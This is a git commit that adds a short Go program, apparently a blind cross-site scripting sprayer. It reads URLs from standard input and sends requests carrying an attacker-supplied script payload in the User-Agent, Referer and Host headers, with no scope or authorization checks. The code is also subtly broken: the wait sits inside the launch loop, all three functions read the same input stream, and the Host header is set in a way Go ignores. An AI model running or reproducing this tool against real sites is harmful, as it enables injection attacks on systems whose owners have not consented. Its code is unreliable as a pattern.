01d359eac3465a6ed187a99f1fb662e35673d2f6
Tojojo <54802990+takshal@users.noreply.github.com>
2023-01-25 03:40:33 -0500

    Create main.go

---
+++ main.go
@@ -0,0 +1,110 @@
+package main 
+
+import (
+"fmt"
+"flag"
+"sync"
+"time"
+"bufio"
+"os"
+"net/http"
+)
+
+const (
+	BannerColor  = "\033[1;34m%s\033[0m\033[1;36m%s\033[0m"
+	TextColor = "\033[1;0m%s\033[1;32m%s\n\033[0m"
+        InfoColor    = "\033[1;0m%s\033[1;35m%s\033[0m"
+        NoticeColor  = "\033[1;0m%s\033[1;34m%s\n\033[0m"
+        
+       
+)
+
+func main () {
+
+	var c int
+	var p string
+
+	flag.IntVar(&c, "C", 30, "Set the Concurrency")
+	flag.StringVar(&p, "p", "", "The Blind XSS Payload")
+	
+	flag.Parse()
+	if p == ""{
+		fmt.Println("Some Argument are not set")
+		return
+	}else {
+		var wg sync.WaitGroup
+		for i:=0; i<c; i++ {
+			wg.Add(1)
+			go func () {
+				agentBxss(p)
+				refBxss(p)
+				hosBxss(p)
+				wg.Done()
+			}()
+			wg.Wait()
+		}
+	}
+}
+
+func agentBxss(payload string ){
+	header:= "User-Agent"
+	time.Sleep(500 * time.Millisecond)
+	scanner:=bufio.NewScanner(os.Stdin)
+	client:=&http.Client{}
+	for scanner.Scan(){
+		link:=scanner.Text()
+		fmt.Println(InfoColor + "[+] Testing url:" + link + "For Blind XSS")
+		fmt.Println(NoticeColor + "[+] Testing field:" + header )
+		fmt.Println(TextColor + "[+] Testing payload:" + payload )
+		req,err:=http.NewRequest("GET", link, nil)
+		if err !=nil{
+		return
+		}
+		req.Header.Add(header, payload)
+		client.Do(req)
+		 
+    }
+	
+}
+func refBxss(payload string ){
+	header:= "Referer"
+	time.Sleep(500 * time.Millisecond)
+	scanner:=bufio.NewScanner(os.Stdin)
+	client:=&http.Client{}
+	for scanner.Scan(){
+		link:=scanner.Text()
+		fmt.Println(InfoColor +"[+] Testing url:" + link + "For Blind XSS")
+		fmt.Println(NoticeColor + "[+] Testing field:" + header )
+		fmt.Println(TextColor +"[+] Testing payload:" + payload )
+		req,err:=http.NewRequest("GET", link, nil)
+		if err !=nil{
+		return
+		}
+		req.Header.Add(header, payload)
+		client.Do(req)
+	}
+}
+	
+func hosBxss(payload string ){
+	header:= "Host"
+	time.Sleep(500 * time.Millisecond)
+	scanner:=bufio.NewScanner(os.Stdin)
+	client:=&http.Client{}
+	for scanner.Scan(){
+		link:=scanner.Text()
+		fmt.Println(InfoColor +"[+] Testing url:" + link + "For Blind XSS")
+		fmt.Println(NoticeColor + "[+] Testing field:" + header )
+		fmt.Println(TextColor +"[+] Testing payload:" + payload )
+		req,err:=http.NewRequest("GET", link, nil)
+		if err !=nil{
+		return
+		}
+		req.Header.Add(header, payload)
+		client.Do(req)
+		 
+
+    }
+
+
+	
+}
